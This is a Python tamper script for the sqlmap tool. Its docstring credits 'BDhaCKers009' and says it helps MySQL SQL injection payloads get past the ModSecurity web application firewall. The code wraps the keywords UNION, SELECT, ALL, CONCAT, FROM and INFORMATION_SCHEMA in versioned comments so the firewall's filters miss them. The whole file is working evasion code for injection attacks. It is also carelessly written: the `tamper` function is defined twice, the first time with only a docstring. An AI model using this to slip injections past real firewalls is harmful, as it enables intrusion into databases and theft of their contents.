#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import randomInt
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Works with only MySql DBMS

    Notes:
        * Useful to bypass ModSecurity WAF and some other wafs also

    The concept of this tamper script is very easy it just replace all strings  to /*!50000strings/**_**/*/ which are blocked by Modsecurity WAF.
    
    

    CREATED BY BDhaCKers009
    """

def tamper(payload, **kwargs):
    return payload.replace("UNION", "/*!50000UnIoN/**_**/*/").replace('SELECT', '/*!50000SeLEcT/**_**/*/').replace('ALL' , '/*!50000ALL/**_**/*/').replace('CONCAT' , '/*!50000CONCAT/**_**/*/').replace('FROM' , '/*!50000FROM/**_**/*/').replace('INFORMATION_SCHEMA' , '/*!50000INFORMATION_SCHEMA/**_**/*/')